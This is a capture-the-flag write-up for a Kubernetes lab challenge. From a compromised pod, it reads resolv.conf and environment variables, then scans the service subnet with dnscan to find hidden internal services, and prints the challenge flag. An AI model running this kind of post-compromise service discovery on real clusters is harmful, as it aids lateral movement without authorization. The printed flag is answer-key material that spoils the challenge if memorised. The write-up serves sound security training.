---
tags:
  - Kubernetes
  - DNS-scaning
title: K8S LAN Party - DNSING with the stars
description: service discovery using dns scan
reference: https://k8slanparty.com/challenge/1
---

## Challenge

You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.

As a warmup, utilize [DNS scanning](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue) to uncover hidden internal services and obtain the flag. We have "loaded your machine with [dnscan](https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e) to ease this process for further challenges.

All the flags in the challenge follow the same format: wiz_k8s_lan_party{*}

## Solution

### 1. Get the k8s DNS server IP

I guess the k8s DNS server IP is within the cluster subnet. 

```
player@wiz-k8s-lan-party:/$ cat /etc/resolv.conf
search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal
nameserver 10.100.120.34
options ndots:5
```

Another way is looking at the k8s API server IP:

```
player@wiz-k8s-lan-party:/$ printenv
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
USER_ID=a9be83d1-2567-405d-83a8-583500445a50
HISTSIZE=2048
PWD=/
HOME=/home/player
KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
HISTFILE=/home/player/.bash_history
TMPDIR=/tmp
TERM=xterm-256color
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1
KUBERNETES_SERVICE_HOST=10.100.0.1
KUBERNETES_PORT=tcp://10.100.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
HISTFILESIZE=2048
_=/usr/bin/printenv
OLDPWD=/opt
```

### 2. find other cluster services using dnscan

```
player@wiz-k8s-lan-party:/$ dnscan -subnet 10.100.0.0/16
34931 / 65536 [--------------------------------------------------------------->_______________________________________________________] 53.30% 993 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.
65335 / 65536 [---------------------------------------------------------------------------------------------------------------------->] 99.69% 993 p/s10.100.136.254 -> getflag-service.k8s-lan-party.svc.cluster.local.
```

### 3. curl the flag service

The response contains the flag

```
player@wiz-k8s-lan-party:/$ curl getflag-service.k8s-lan-party.svc.cluster.local.
wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}player@wiz-k8s-lan-party:/$ 
```